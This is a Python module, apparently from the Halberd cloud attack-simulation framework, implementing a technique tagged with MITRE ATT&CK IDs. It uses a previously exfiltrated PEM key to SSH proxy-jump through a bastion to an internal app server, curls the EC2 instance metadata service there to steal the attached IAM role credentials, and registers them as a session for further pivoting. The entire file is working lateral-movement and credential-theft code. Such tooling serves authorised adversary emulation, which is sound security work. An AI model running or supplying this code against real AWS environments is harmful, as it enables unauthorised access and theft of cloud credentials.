from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import json
import os
import stat
import tempfile
from botocore.exceptions import ClientError
from core.aws.aws_session_manager import SessionManager

@TechniqueRegistry.register
class AWSSSHIMDSCredentialTheft(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1021.004",
                technique_name="Remote Services",
                tactics=["Lateral Movement"],
                sub_technique_name="SSH"
            ),
            MitreTechnique(
                technique_id="T1552.007",
                technique_name="Credentials from Password Stores",
                tactics=["Credential Access"],
                sub_technique_name="Container API"
            )
        ]
        super().__init__(
            "SSH IMDS Credential Theft",
            "Proxy-jumps through a bastion/web server to reach an internal app server using a "
            "previously exfiltrated PEM key, then queries the EC2 Instance Metadata Service (IMDSv1) "
            "locally on the app server to steal the IAM role credentials attached to it. "
            "Uses paramiko for the SSH proxy-jump chain, executes a curl command against "
            "http://169.254.169.254 on the target, and registers the stolen credentials as a new "
            "Halberd AWS session so subsequent playbook steps pivot automatically.",
            mitre_techniques
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)

        # Import here so the module loads even if paramiko is missing;
        # the ImportError surfaces as a clean FAILURE rather than a crash.
        try:
            import paramiko
        except ImportError:
            return ExecutionStatus.FAILURE, {
                "error": "paramiko is not installed",
                "message": "Install paramiko: pip install paramiko"
            }

        try:
            jump_host_ip: str = kwargs.get("jump_host_ip", None)
            jump_host_user: str = kwargs.get("jump_host_user", "ec2-user")
            jump_host_port: int = kwargs.get("jump_host_port", 22)
            target_host_ip: str = kwargs.get("target_host_ip", None)
            target_host_user: str = kwargs.get("target_host_user", "ec2-user")
            target_host_port: int = kwargs.get("target_host_port", 22)
            pem_key_path: str = kwargs.get("pem_key_path", None)
            role_name: str = kwargs.get("role_name", None)
            session_name: str = kwargs.get("session_name", "ssh-stolen-creds")
            aws_region: str = kwargs.get("aws_region", "us-east-1")
            set_as_active_session: bool = kwargs.get("set_as_active_session", True)

            if any(v in [None, ""] for v in [jump_host_ip, target_host_ip, pem_key_path, role_name]):
                return ExecutionStatus.FAILURE, {
                    "error": {"Error": "Invalid Technique Input"},
                    "message": "jump_host_ip, target_host_ip, pem_key_path, and role_name are all required"
                }

            # Resolve path relative to /app (container working dir) if not absolute
            if not os.path.isabs(pem_key_path):
                pem_key_path = os.path.join("/app", pem_key_path)

            if not os.path.exists(pem_key_path):
                return ExecutionStatus.FAILURE, {
                    "error": f"Key file not found: {pem_key_path}",
                    "message": f"PEM key not found at {pem_key_path} — confirm the S3 exfil step ran and the filename matches"
                }

            # Ensure the key file has correct permissions (SSH rejects world-readable keys)
            key_perms = os.stat(pem_key_path).st_mode
            if key_perms & (stat.S_IRGRP | stat.S_IROTH):
                os.chmod(pem_key_path, stat.S_IRUSR | stat.S_IWUSR)

            # Load key explicitly as RSA to avoid paramiko 5.x auto-detection bug
            # where Ed25519Key.from_private_key_file is tried first and raises SSHException
            # on PKCS#1 RSA keys rather than falling through to RSAKey.
            pkey = paramiko.RSAKey.from_private_key_file(pem_key_path)

            jump_client = None
            target_client = None

            try:
                # ── Step 1: Connect to jump host (web server / bastion) ──────────────
                jump_client = paramiko.SSHClient()
                jump_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                jump_client.connect(
                    hostname=jump_host_ip,
                    port=jump_host_port,
                    username=jump_host_user,
                    pkey=pkey,
                    timeout=30,
                    look_for_keys=False,
                    allow_agent=False
                )

                # ── Step 2: Open a forwarded channel to the target host ───────────────
                jump_transport = jump_client.get_transport()
                dest_addr = (target_host_ip, target_host_port)
                src_addr = (jump_host_ip, 0)
                channel = jump_transport.open_channel("direct-tcpip", dest_addr, src_addr)

                # ── Step 3: Connect to target host through the channel ────────────────
                target_client = paramiko.SSHClient()
                target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                target_client.connect(
                    hostname=target_host_ip,
                    port=target_host_port,
                    username=target_host_user,
                    pkey=pkey,
                    sock=channel,
                    timeout=30,
                    look_for_keys=False,
                    allow_agent=False
                )

                # ── Step 4: Query IMDSv1 locally from the app server ─────────────────
                imds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                cmd = f"curl -s --connect-timeout 5 --max-time 10 '{imds_url}'"
                _, stdout, stderr = target_client.exec_command(cmd, timeout=20)
                raw_output = stdout.read().decode().strip()
                err_output = stderr.read().decode().strip()

                if not raw_output:
                    return ExecutionStatus.FAILURE, {
                        "error": err_output or "Empty response from IMDS",
                        "message": f"curl to IMDS returned nothing — IMDSv1 may be disabled or role '{role_name}' does not exist on the target instance"
                    }

                try:
                    creds = json.loads(raw_output)
                except json.JSONDecodeError:
                    return ExecutionStatus.FAILURE, {
                        "error": f"Non-JSON IMDS response: {raw_output[:300]}",
                        "message": "IMDS did not return valid JSON — check the role_name parameter"
                    }

            finally:
                if target_client:
                    target_client.close()
                if jump_client:
                    jump_client.close()

            access_key = creds.get("AccessKeyId")
            secret_key = creds.get("SecretAccessKey")
            token = creds.get("Token")
            expiration = creds.get("Expiration", "N/A")

            if not all([access_key, secret_key, token]):
                missing = [k for k, v in {"AccessKeyId": access_key, "SecretAccessKey": secret_key, "Token": token}.items() if not v]
                return ExecutionStatus.FAILURE, {
                    "error": f"Missing credential fields: {missing}",
                    "message": f"IMDS responded but credential fields were absent — response keys: {list(creds.keys())}"
                }

            # ── Step 5: Register stolen credentials as a new Halberd session ─────────
            manager = SessionManager()
            result = manager.create_session(
                session_name=session_name,
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=token,
                region_name=aws_region
            )

            if "error" in result:
                return ExecutionStatus.FAILURE, {
                    "error": result["error"],
                    "message": "Credentials stolen but boto3 session creation failed — token may have expired"
                }

            if set_as_active_session:
                manager.set_active_session(session_name)

            return ExecutionStatus.SUCCESS, {
                "message": (
                    f"Successfully stole {role_name} credentials via SSH proxy-jump "
                    f"({jump_host_ip} → {target_host_ip}) and established session '{session_name}'"
                ),
                "value": {
                    "role_name": role_name,
                    "access_key_id": access_key,
                    "expiration": expiration,
                    "jump_host": jump_host_ip,
                    "target_host": target_host_ip,
                    "session_name": session_name,
                    "active_session": set_as_active_session
                }
            }

        except ClientError as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "SSH IMDS credential theft failed (AWS client error)"
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "SSH IMDS credential theft failed"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "jump_host_ip": {"type": "str", "required": True, "default": None, "name": "Jump Host IP (Web Server)", "input_field_type": "text"},
            "jump_host_user": {"type": "str", "required": False, "default": "ec2-user", "name": "Jump Host SSH User", "input_field_type": "text"},
            "jump_host_port": {"type": "int", "required": False, "default": 22, "name": "Jump Host SSH Port", "input_field_type": "number"},
            "target_host_ip": {"type": "str", "required": True, "default": None, "name": "Target Host IP (App Server)", "input_field_type": "text"},
            "target_host_user": {"type": "str", "required": False, "default": "ec2-user", "name": "Target Host SSH User", "input_field_type": "text"},
            "target_host_port": {"type": "int", "required": False, "default": 22, "name": "Target Host SSH Port", "input_field_type": "number"},
            "pem_key_path": {"type": "str", "required": True, "default": None, "name": "PEM Key Path", "input_field_type": "text"},
            "role_name": {"type": "str", "required": True, "default": None, "name": "IAM Role Name on App Server", "input_field_type": "text"},
            "session_name": {"type": "str", "required": False, "default": "ssh-stolen-creds", "name": "Halberd Session Name", "input_field_type": "text"},
            "aws_region": {"type": "str", "required": False, "default": "us-east-1", "name": "AWS Region", "input_field_type": "text"},
            "set_as_active_session": {"type": "bool", "required": False, "default": True, "name": "Set As Active Session?", "input_field_type": "bool"}
        }
